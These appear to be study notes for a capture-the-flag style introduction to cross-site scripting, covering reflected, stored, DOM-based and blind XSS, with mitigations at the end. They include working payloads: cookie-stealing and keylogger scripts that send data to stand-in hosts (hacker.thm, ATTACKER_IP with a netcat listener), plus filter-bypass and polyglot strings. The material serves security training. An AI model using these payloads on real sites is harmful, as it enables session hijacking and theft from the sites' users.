# 📌 Introduction to Cross-site Scripting (XSS)

---

## ✅ Task 1: Room Brief

Cross-Site Scripting (**XSS**) is a security vulnerability classified as an injection attack, where malicious JavaScript is injected into web applications to be executed by other users.

### Prerequisites:

* Basic understanding of JavaScript
* Basic understanding of Client-Server interactions

### Real-world Impact Examples:

* Shopify XSS
* \$7,500 reward for Steam chat XSS
* \$2,500 reward for HackerOne XSS
* Infogram XSS

---

## ✅ Task 2: XSS Payloads

### What is a payload?

A payload in XSS is JavaScript code intended to execute on a target’s browser.

### Common Payloads:

**Proof Of Concept:**

```html
<script>alert('XSS');</script>
```

**Session Stealing:**

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger:**

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
```

**Business Logic Exploit:**

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

---

## ✅ Task 3: Reflected XSS

Reflected XSS occurs when input is directly reflected without validation.

### Example Scenario:

User input is directly reflected in an error message without validation:

```html
http://website.thm/?error=<script>alert('XSS');</script>
```

### How to Test:

* URL parameters
* HTTP headers (rare)
* URL path

---

## ✅ Task 4: Stored XSS

Stored XSS payload is saved in databases and executed when users view content.

### Example Scenario:

Comments on a blog:

```html
<script>alert('XSS');</script>
```

### How to Test:

* User-generated content (comments, profiles, posts)
* Manipulate expected input types

---

## ✅ Task 5: DOM Based XSS

DOM-based XSS exploits happen within the Document Object Model (DOM) without server-side changes.

### Exploitation Example:

Manipulating the URL hash:

```html
http://website.thm/#<script>alert('XSS')</script>
```

### Testing Steps:

* Identify JavaScript code handling input
* Analyze DOM interactions (e.g., `window.location`)

---

## ✅ Task 6: Blind XSS

Blind XSS is stored and executed in an environment not directly accessible by the attacker.

### Example Scenario:

Support ticket systems:

```html
<script>fetch('https://hacker.thm/log?cookie=' + btoa(document.cookie));</script>
```

### Testing Method:

* Use tools like XSS Hunter Express
* Include callback payloads

---

## ✅ Task 7: Perfecting your Payload

### Key Payload Modifications:

**Basic Alert Payload:**

```html
<script>alert('THM');</script>
```

**Escaping input tag:**

```html
"><script>alert('THM');</script>
```

**Escaping textarea tag:**

```html
</textarea><script>alert('THM');</script>
```

**Escaping JavaScript contexts:**

```html
';alert('THM');//
```

**Bypassing filters:**

```html
<sscriptcript>alert('THM');</sscriptcript>
```

**IMG Tag Event:**

```html
/images/cat.jpg" onload="alert('THM');
```

**Universal Polyglot Payload:**

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

---

## ✅ Task 8: Practical Blind XSS Example

### Steps for Exploitation:

1. **Create Account & Login**: `https://LAB_WEB_URL.p.thmlabs.com`
2. **Submit Basic Ticket:** Enter "test" and submit.
3. **Payload for initial test:**

```html
</textarea>test
```

4. **XSS Payload Test:**

```html
</textarea><script>alert('THM');</script>
```

5. **Session Cookie Stealing Payload:**

* Start netcat listener:

```bash
nc -nlvp 9001
```

* Payload to exfiltrate cookie:

```html
</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>
```

* Decode the Base64 cookie on reception.

---

## ✅ Recommendations & Mitigations:

* Implement strict input validation.
* Utilize Content Security Policies (CSP).
* Encode output based on context.
* Regularly audit and update your web applications.

---

🎉 **Happy Hacking!**
